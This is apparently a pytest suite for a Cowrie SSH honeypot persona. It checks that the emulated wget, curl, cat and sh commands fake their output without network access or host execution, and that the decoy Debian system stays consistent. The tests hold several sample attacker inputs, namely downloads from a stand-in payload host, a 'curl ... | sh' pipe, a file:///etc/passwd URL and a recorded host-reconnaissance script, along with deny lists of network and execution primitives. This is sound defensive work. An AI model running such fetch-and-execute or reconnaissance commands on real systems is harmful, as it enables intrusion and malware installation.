from __future__ import annotations

import importlib.util
import sys
import types
from datetime import UTC, datetime, timedelta
from pathlib import Path

ROOT = Path(__file__).parents[1]
PERSONA = ROOT / "deploy" / "cowrie-persona"
SAFE_TRANSFER = PERSONA / "commands" / "safe_transfer.py"
PERSONA_V2 = PERSONA / "commands" / "persona_v2.py"
SAFE_CAT = PERSONA / "commands" / "safe_cat.py"
SAFE_SHELL = PERSONA / "commands" / "safe_shell.py"


def _load_safe_transfer():
    class HoneyPotCommand:
        pass

    class PermissionDenied(Exception):
        pass

    cowrie = types.ModuleType("cowrie")
    shell = types.ModuleType("cowrie.shell")
    command = types.ModuleType("cowrie.shell.command")
    fs = types.ModuleType("cowrie.shell.fs")
    command.HoneyPotCommand = HoneyPotCommand
    fs.PermissionDenied = PermissionDenied

    previous = {
        name: sys.modules.get(name)
        for name in ("cowrie", "cowrie.shell", "cowrie.shell.command", "cowrie.shell.fs")
    }
    sys.modules.update(
        {
            "cowrie": cowrie,
            "cowrie.shell": shell,
            "cowrie.shell.command": command,
            "cowrie.shell.fs": fs,
        }
    )
    try:
        spec = importlib.util.spec_from_file_location("persona_safe_transfer", SAFE_TRANSFER)
        assert spec and spec.loader
        module = importlib.util.module_from_spec(spec)
        sys.modules[spec.name] = module
        spec.loader.exec_module(module)
        return module
    finally:
        sys.modules.pop("persona_safe_transfer", None)
        for name, value in previous.items():
            if value is None:
                sys.modules.pop(name, None)
            else:
                sys.modules[name] = value


def _load_persona_v2():
    class HoneyPotCommand:
        pass

    cowrie = types.ModuleType("cowrie")
    shell = types.ModuleType("cowrie.shell")
    command = types.ModuleType("cowrie.shell.command")
    command.HoneyPotCommand = HoneyPotCommand
    previous = {
        name: sys.modules.get(name)
        for name in ("cowrie", "cowrie.shell", "cowrie.shell.command")
    }
    sys.modules.update(
        {"cowrie": cowrie, "cowrie.shell": shell, "cowrie.shell.command": command}
    )
    try:
        spec = importlib.util.spec_from_file_location("persona_v2", PERSONA_V2)
        assert spec and spec.loader
        module = importlib.util.module_from_spec(spec)
        sys.modules[spec.name] = module
        spec.loader.exec_module(module)
        return module
    finally:
        sys.modules.pop("persona_v2", None)
        for name, value in previous.items():
            if value is None:
                sys.modules.pop(name, None)
            else:
                sys.modules[name] = value


def _load_safe_shell():
    class CommandSh:
        delegated = False

        def start(self) -> None:
            self.delegated = True

    class HoneyPotShell:
        def lineReceived(self, line: str) -> None:
            self.delegated_line = line

        def _finish(self) -> None:
            self.finished = True

    def emulate(
        tool: str, _args: list[str], **_kwargs: object
    ) -> types.SimpleNamespace:
        values = {
            "uname": "x86_64\n",
            "nproc": "8\n",
            "last": "deploy pts/0 192.0.2.44\n",
        }
        return types.SimpleNamespace(stdout=values[tool])

    def persona_state(_protocol: object) -> types.SimpleNamespace:
        return types.SimpleNamespace(seed=0)

    def synthetic_proc_uptime(**_kwargs: object) -> str:
        now = _kwargs.get("now")
        if isinstance(now, datetime):
            boot = datetime(2026, 7, 18, 11, 23, 41, tzinfo=UTC)
            seconds = max(0.0, (now - boot).total_seconds())
            return f"{seconds:.2f} {seconds * 7.75:.2f}"
        return "3651482.00 28377505.00"

    cowrie = types.ModuleType("cowrie")
    commands_package = types.ModuleType("cowrie.commands")
    bash = types.ModuleType("cowrie.commands.bash")
    persona_v2 = types.ModuleType("cowrie.commands.persona_v2")
    shell = types.ModuleType("cowrie.shell")
    honeypot = types.ModuleType("cowrie.shell.honeypot")
    bash.Command_sh = CommandSh
    persona_v2.emulate = emulate
    persona_v2.persona_state = persona_state
    persona_v2.synthetic_proc_uptime = synthetic_proc_uptime
    honeypot.HoneyPotShell = HoneyPotShell
    previous = {
        name: sys.modules.get(name)
        for name in (
            "cowrie",
            "cowrie.commands",
            "cowrie.commands.bash",
            "cowrie.commands.persona_v2",
            "cowrie.shell",
            "cowrie.shell.honeypot",
        )
    }
    sys.modules.update(
        {
            "cowrie": cowrie,
            "cowrie.commands": commands_package,
            "cowrie.commands.bash": bash,
            "cowrie.commands.persona_v2": persona_v2,
            "cowrie.shell": shell,
            "cowrie.shell.honeypot": honeypot,
        }
    )
    try:
        spec = importlib.util.spec_from_file_location("persona_safe_shell", SAFE_SHELL)
        assert spec and spec.loader
        module = importlib.util.module_from_spec(spec)
        sys.modules[spec.name] = module
        spec.loader.exec_module(module)
        return module
    finally:
        sys.modules.pop("persona_safe_shell", None)
        for name, value in previous.items():
            if value is None:
                sys.modules.pop(name, None)
            else:
                sys.modules[name] = value


def _load_safe_cat():
    class CommandCat:
        delegated = False

        def start(self) -> None:
            self.delegated = True

    def persona_state(_protocol: object) -> types.SimpleNamespace:
        return types.SimpleNamespace(seed=0)

    def synthetic_proc_uptime(**_kwargs: object) -> str:
        return "3738979.00 28977087.25"

    cowrie = types.ModuleType("cowrie")
    commands_package = types.ModuleType("cowrie.commands")
    cat = types.ModuleType("cowrie.commands.cat")
    persona_v2 = types.ModuleType("cowrie.commands.persona_v2")
    cat.Command_cat = CommandCat
    persona_v2.persona_state = persona_state
    persona_v2.synthetic_proc_uptime = synthetic_proc_uptime
    previous = {
        name: sys.modules.get(name)
        for name in (
            "cowrie",
            "cowrie.commands",
            "cowrie.commands.cat",
            "cowrie.commands.persona_v2",
        )
    }
    sys.modules.update(
        {
            "cowrie": cowrie,
            "cowrie.commands": commands_package,
            "cowrie.commands.cat": cat,
            "cowrie.commands.persona_v2": persona_v2,
        }
    )
    try:
        spec = importlib.util.spec_from_file_location("persona_safe_cat", SAFE_CAT)
        assert spec and spec.loader
        module = importlib.util.module_from_spec(spec)
        sys.modules[spec.name] = module
        spec.loader.exec_module(module)
        return module
    finally:
        sys.modules.pop("persona_safe_cat", None)
        for name, value in previous.items():
            if value is None:
                sys.modules.pop(name, None)
            else:
                sys.modules[name] = value


def test_wget_and_curl_intent_is_parsed_without_contacting_network() -> None:
    module = _load_safe_transfer()

    wget = module.parse_wget(
        ["-q", "-O", "/tmp/stage.sh", "https://payload.invalid/stage.sh"]
    )
    curl = module.parse_curl(
        ["-fsSL", "https://payload.invalid/stage.sh", "-o", "/tmp/stage.sh"]
    )

    assert wget == module.TransferIntent(
        url="https://payload.invalid/stage.sh", output="/tmp/stage.sh", quiet=True
    )
    assert curl == module.TransferIntent(
        url="https://payload.invalid/stage.sh", output="/tmp/stage.sh", quiet=True
    )


def test_transfer_emulator_rejects_non_network_and_malformed_urls() -> None:
    module = _load_safe_transfer()

    assert module.parse_wget(["file:///etc/passwd"]) is None
    assert module.parse_curl(["https://[broken.invalid/payload"]) is None


def test_transfer_emulator_contains_no_network_client_imports() -> None:
    source = SAFE_TRANSFER.read_text(encoding="utf-8").lower()

    for forbidden in (
        "import socket",
        "import treq",
        "import requests",
        "urllib.request",
        "import httpx",
        "open_connection",
    ):
        assert forbidden not in source
    assert b"#!/bin/sh\nexit 0\n" == (PERSONA / "safe-placeholder.sh").read_bytes()


def test_safe_transfer_override_is_loaded_last_and_only_replaces_transfer_tools() -> None:
    registry = (PERSONA / "commands" / "__init__.py").read_text(encoding="utf-8")

    assert registry.rfind('"safe_transfer"') > registry.rfind('"wget"')
    module = _load_safe_transfer()
    assert set(module.commands) == {
        "/usr/bin/wget",
        "wget",
        "/usr/bin/dget",
        "dget",
        "/usr/bin/curl",
        "curl",
    }


def test_persona_v2_emulates_observed_discovery_paths_consistently() -> None:
    module = _load_persona_v2()
    now = datetime(2026, 8, 29, 17, 42, 3, tzinfo=UTC)

    uname = module.emulate("uname", ["-s", "-v", "-n", "-r", "-m"])
    assert uname.exit_code == 0
    assert uname.stdout.startswith("Linux app-prod-01 6.1.0-21-amd64")
    assert uname.stdout.endswith("x86_64\n")
    assert module.emulate("nproc", []).stdout == "8\n"
    assert "CPU(s):                               8" in module.emulate("lscpu", []).stdout
    assert "15996" in module.emulate("free", ["-m"], now=now).stdout
    assert "Tesla T4" in module.emulate("lspci", []).stdout
    assert "Up 42 days" in module.emulate("docker", ["ps"], now=now).stdout
    assert "app-worker.service" in module.emulate(
        "systemctl", ["list-units"], now=now
    ).stdout

    for path in (
        "uname",
        "/bin/uname",
        "/usr/bin/uname",
        "/bin/./uname",
        "date",
        "/bin/date",
    ):
        assert path in module.commands


def test_persona_v3_time_and_metrics_progress_without_internal_drift() -> None:
    module = _load_persona_v2()
    state = module.PersonaState(seed=1234)
    first = datetime(2026, 8, 30, 10, 0, 0, tzinfo=UTC)
    second = first + timedelta(seconds=65)

    first_uptime = module.emulate("uptime", [], state=state, now=first).stdout
    second_uptime = module.emulate("uptime", [], state=state, now=second).stdout
    assert first_uptime.startswith(" 10:00:00 up 42 days")
    assert second_uptime.startswith(" 10:01:05 up 42 days")
    assert first_uptime != second_uptime

    first_proc = module.synthetic_proc_uptime(state=state, now=first)
    second_proc = module.synthetic_proc_uptime(state=state, now=second)
    assert float(second_proc.split()[0]) - float(first_proc.split()[0]) == 65
    idle_delta = float(second_proc.split()[1]) - float(first_proc.split()[1])
    assert 0 < idle_delta <= 8 * 65

    memory = module.emulate("free", ["-m"], state=state, now=first).stdout
    fields = memory.splitlines()[1].split()
    total, used, free, _shared, cache, available = map(int, fields[1:])
    assert total == 15_996
    assert used + free + cache == total
    assert free < available < total


def test_persona_v3_host_metrics_are_consistent_across_reconnects() -> None:
    module = _load_persona_v2()
    first_session = module.PersonaState(seed=1234)
    second_session = module.PersonaState(seed=9876)
    first = datetime(2026, 8, 30, 18, 31, 48, tzinfo=UTC)
    second = first + timedelta(seconds=183)

    assert module.synthetic_proc_uptime(
        state=first_session, now=first
    ) == module.synthetic_proc_uptime(state=second_session, now=first)
    assert module.emulate(
        "free", ["-m"], state=first_session, now=first
    ) == module.emulate("free", ["-m"], state=second_session, now=first)
    assert module.emulate(
        "uptime", [], state=first_session, now=first
    ) == module.emulate("uptime", [], state=second_session, now=first)

    first_proc = module.synthetic_proc_uptime(state=first_session, now=first)
    second_proc = module.synthetic_proc_uptime(state=second_session, now=second)
    assert float(second_proc.split()[0]) - float(first_proc.split()[0]) == 183
    idle_delta = float(second_proc.split()[1]) - float(first_proc.split()[1])
    assert 0 < idle_delta <= 8 * 183


def test_persona_v3_is_repeatable_within_one_instant_and_supports_date() -> None:
    module = _load_persona_v2()
    state = module.PersonaState(seed=9876)
    now = datetime(2026, 8, 30, 10, 5, 7, tzinfo=UTC)

    assert module.emulate("free", ["-m"], state=state, now=now) == module.emulate(
        "free", ["-m"], state=state, now=now
    )
    assert module.emulate("date", ["-u", "+%FT%TZ"], state=state, now=now).stdout == (
        "2026-08-30T10:05:07Z\n"
    )
    assert module.emulate("date", ["+%s"], state=state, now=now).stdout == (
        f"{int(now.timestamp())}\n"
    )


def test_persona_v3_keeps_one_stable_state_per_protocol() -> None:
    module = _load_persona_v2()
    protocol = types.SimpleNamespace(sessionno="session-123")

    first = module.persona_state(protocol)
    second = module.persona_state(protocol)

    assert first is second
    assert first.seed != module.persona_state(
        types.SimpleNamespace(sessionno="session-456")
    ).seed


def test_persona_v2_writes_and_dispatches_the_exact_emulated_response() -> None:
    module = _load_persona_v2()
    dispatched: list[tuple[str, dict[str, object]]] = []
    written: list[str] = []

    class Events:
        def dispatch(self, event_id: str, _message: str, **fields: object) -> None:
            dispatched.append((event_id, fields))

    command = module.Command_nproc()
    command.args = []
    command.protocol = types.SimpleNamespace(events=Events())
    command.write = written.append
    command.errorWrite = lambda value: written.append(value)
    command.call()

    assert written == ["8\n"]
    assert dispatched == [
        (
            "cowrie.command.output.emulated",
            {
                "tool": "nproc",
                "input": "nproc",
                "stdout": "8\n",
                "stderr": "",
                "exit_code": 0,
                "emulated": True,
            },
        )
    ]


def test_persona_v2_has_no_host_execution_or_network_primitives() -> None:
    source = PERSONA_V2.read_text(encoding="utf-8").lower()
    for forbidden in (
        "import socket",
        "import subprocess",
        "import requests",
        "urllib.request",
        "os.system",
        "popen(",
        "run(",
    ):
        assert forbidden not in source
    assert "cowrie.command.output.emulated" in source
    assert "max_telemetry_text = 8192" in source


def test_persona_v2_is_loaded_after_safe_transfer_without_replacing_it() -> None:
    registry = (PERSONA / "commands" / "__init__.py").read_text(encoding="utf-8")
    assert registry.rfind('"persona_v2"') > registry.rfind('"safe_transfer"')
    module = _load_persona_v2()
    assert not {"wget", "curl"} & set(module.commands)


def test_safe_cat_only_intercepts_proc_uptime_and_records_exact_output() -> None:
    module = _load_safe_cat()
    dispatched: list[tuple[str, dict[str, object]]] = []
    written: list[str] = []

    class Events:
        def dispatch(self, event_id: str, _message: str, **fields: object) -> None:
            dispatched.append((event_id, fields))

    command = module.Command_safe_cat()
    command.args = ["/proc/uptime"]
    command.protocol = types.SimpleNamespace(events=Events())
    command.write = written.append
    command.exit = lambda: None
    command.start()

    assert written == ["3738979.00 28977087.25\n"]
    assert command.exit_code == 0
    assert dispatched[0][0] == "cowrie.command.output.emulated"
    assert dispatched[0][1]["tool"] == "cat-proc-uptime"
    assert dispatched[0][1]["stdout"] == written[0]

    delegated = module.Command_safe_cat()
    delegated.args = ["/etc/os-release"]
    delegated.start()
    assert delegated.delegated is True


def test_safe_cat_is_loaded_after_persona_and_contains_no_host_reads() -> None:
    registry = (PERSONA / "commands" / "__init__.py").read_text(encoding="utf-8")
    source = SAFE_CAT.read_text(encoding="utf-8").lower()
    compose = (ROOT / "compose.yaml").read_text(encoding="utf-8")

    assert registry.rfind('"safe_cat"') > registry.rfind('"persona_v2"')
    assert (
        "./deploy/cowrie-persona/commands/safe_cat.py:"
        "/cowrie/cowrie-git/src/cowrie/commands/safe_cat.py:ro"
    ) in compose
    assert "super().start()" in source
    for forbidden in ("open(", "pathlib", "subprocess", "socket", "/sys/"):
        assert forbidden not in source


def test_safe_shell_recognizes_only_the_observed_filter_self_test() -> None:
    module = _load_safe_shell()
    probe = (
        "printf '#!/bin/bash\\necho \\\"xxxxxx\\\"\\n' > filter && "
        "chmod +x filter && ./filter && rm -rf filter"
    )

    assert module.extract_c_script(["-c", f"'{probe}'"]) == probe
    assert module.is_safe_filter_probe(probe)
    assert not module.is_safe_filter_probe("printf x > filter && chmod +x filter")
    assert not module.is_safe_filter_probe(
        f"{probe}; curl https://payload.invalid/stage | sh"
    )
    assert not module.is_safe_filter_probe(
        "printf xxxxxx > filter && chmod +x filter && ./filter && "
        "rm -rf filter && id"
    )


def test_safe_shell_returns_marker_and_records_probe_without_execution() -> None:
    module = _load_safe_shell()
    dispatched: list[tuple[str, dict[str, object]]] = []
    written: list[str] = []

    class Events:
        def dispatch(self, event_id: str, _message: str, **fields: object) -> None:
            dispatched.append((event_id, fields))

    probe = (
        "printf '#!/bin/sh\\necho xxxxxx\\n' > filter && "
        "chmod +x filter && ./filter && rm -rf filter"
    )
    command = module.Command_safe_sh()
    command.args = ["-c", probe]
    command.protocol = types.SimpleNamespace(events=Events())
    command.write = written.append
    command.exit = lambda: None
    command.start()

    assert written == ["xxxxxx\n"]
    assert command.exit_code == 0
    assert dispatched[0][0] == "cowrie.command.output.emulated"
    assert dispatched[0][1]["probe"] == "write_chmod_execute_cleanup"
    assert dispatched[0][1]["stdout"] == "xxxxxx\n"


def test_safe_shell_delegates_every_unrecognized_script_to_cowrie() -> None:
    module = _load_safe_shell()
    command = module.Command_safe_sh()
    command.args = ["-c", "echo ordinary-command"]

    command.start()

    assert command.delegated is True


def test_safe_shell_is_last_and_has_no_execution_or_network_primitives() -> None:
    registry = (PERSONA / "commands" / "__init__.py").read_text(encoding="utf-8")
    source = SAFE_SHELL.read_text(encoding="utf-8").lower()

    assert registry.rfind('"safe_shell"') > registry.rfind('"persona_v2"')
    module = _load_safe_shell()
    assert set(module.commands) == {
        "bash",
        "/bin/bash",
        "/usr/bin/bash",
        "sh",
        "/bin/sh",
        "/usr/bin/sh",
    }
    for forbidden in (
        "import socket",
        "import subprocess",
        "import requests",
        "urllib.request",
        "os.system",
        "popen(",
    ):
        assert forbidden not in source
    assert "super().start()" in source
    assert "cowrie.command.output.emulated" in source


def _complete_host_probe() -> str:
    return """export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
uname=$(uname -s -v -n -m)
arch=$(uname -m)
uptime=$(cat /proc/uptime)
cpus=$(nproc)
cpu_model=$(lscpu | head -1)
gpu_info=$(lspci | grep -i vga)
last_output=$(last)
filter_output=$(echo '===SHELL_BEHAVIOR==='; printf 'execute_err='; bash -c 'printf "#!/bin/sh\\necho xxxxxx\\n" > filter && chmod +x filter && ./filter && rm -rf filter')
echo "UNAME:$uname"
echo "ARCH:$arch"
echo "UPTIME:$uptime"
echo "CPUS:$cpus"
echo "CPU_MODEL:$cpu_model"
echo "GPU:$gpu_info"
echo "LAST:$last_output"
echo "FILTER:$filter_output"
"""


def test_full_probe_match_is_strict_and_rejects_appended_or_network_input() -> None:
    module = _load_safe_shell()
    probe = _complete_host_probe()
    one_line_probe = "; ".join(probe.splitlines())
    openssh_probe = one_line_probe.replace('"', "")

    assert module.is_full_host_capability_probe(probe)
    assert module.is_full_host_capability_probe(one_line_probe)
    assert module.is_full_host_capability_probe(openssh_probe)
    assert not module.is_full_host_capability_probe(probe + "\nid")
    assert not module.is_full_host_capability_probe(one_line_probe + "; id")
    assert not module.is_full_host_capability_probe(openssh_probe + "; id")
    assert not module.is_full_host_capability_probe(
        probe.replace("cpus=$(nproc)", "cpus=$(curl https://payload.invalid/cpu)")
    )
    assert not module.is_full_host_capability_probe(probe.replace("gpu_info=$(", "gpu=$("))


def test_full_probe_fast_path_returns_complete_report_and_telemetry() -> None:
    module = _load_safe_shell()
    dispatched: list[tuple[str, dict[str, object]]] = []
    written: list[bytes] = []

    class Events:
        def dispatch(self, event_id: str, _message: str, **fields: object) -> None:
            dispatched.append((event_id, fields))

    shell = module.HoneyPotShell()
    shell.protocol = types.SimpleNamespace(
        events=Events(), terminal=types.SimpleNamespace(write=written.append)
    )
    shell.lineReceived(_complete_host_probe())

    response = written[0].decode("utf-8")
    assert shell.finished is True
    assert shell.last_exit_code == 0
    assert response.startswith("UNAME:")
    assert "ARCH:x86_64\n" in response
    assert "CPUS:8\n" in response
    assert "Tesla T4" in response
    assert "FILTER:===SHELL_BEHAVIOR===" in response
    assert response.endswith("===DONE===\n")
    assert len(response) <= 8192
    assert [event_id for event_id, _fields in dispatched] == [
        "cowrie.command.input",
        "cowrie.command.output.emulated",
    ]
    assert dispatched[1][1]["tool"] == "host-capability-probe"
    assert dispatched[1][1]["probe"] == "complete_host_capability_inventory"


def test_full_probe_uses_one_injected_clock_for_dynamic_proc_uptime() -> None:
    module = _load_safe_shell()
    first = datetime(2026, 8, 30, 10, 0, 0, tzinfo=UTC)
    second = first + timedelta(seconds=65)

    first_response = module.full_probe_response(state=object(), now=first)
    second_response = module.full_probe_response(state=object(), now=second)
    first_seconds = float(first_response.split("UPTIME:", 1)[1].split()[0])
    second_seconds = float(second_response.split("UPTIME:", 1)[1].split()[0])

    assert second_seconds - first_seconds == 65


def test_full_probe_patch_delegates_unrecognized_lines_to_original_shell() -> None:
    module = _load_safe_shell()
    shell = module.HoneyPotShell()

    shell.lineReceived("echo ordinary-command")

    assert shell.delegated_line == "echo ordinary-command"


def test_debian_persona_is_internally_consistent() -> None:
    honeyfs = PERSONA / "honeyfs"

    assert (honeyfs / "etc" / "hostname").read_text(encoding="utf-8").strip() == (
        "app-prod-01"
    )
    os_release = (honeyfs / "etc" / "os-release").read_text(encoding="utf-8")
    version = (honeyfs / "proc" / "version").read_text(encoding="utf-8")
    assert 'VERSION_ID="12"' in os_release
    assert "Debian" in version
    assert "6.1.0-21-amd64" in version
    cpuinfo = (honeyfs / "proc" / "cpuinfo").read_text(encoding="utf-8")
    meminfo = (honeyfs / "proc" / "meminfo").read_text(encoding="utf-8")
    assert cpuinfo.count("processor\t:") == 8
    assert "MemTotal:       16379904 kB" in meminfo
    assert (honeyfs / "proc" / "uptime").read_text(encoding="utf-8").startswith(
        "3651482.17"
    )
    assert (honeyfs / "etc" / "systemd" / "system" / "app-worker.service").is_file()
    assert "phil" not in (honeyfs / "etc" / "passwd").read_text(encoding="utf-8")
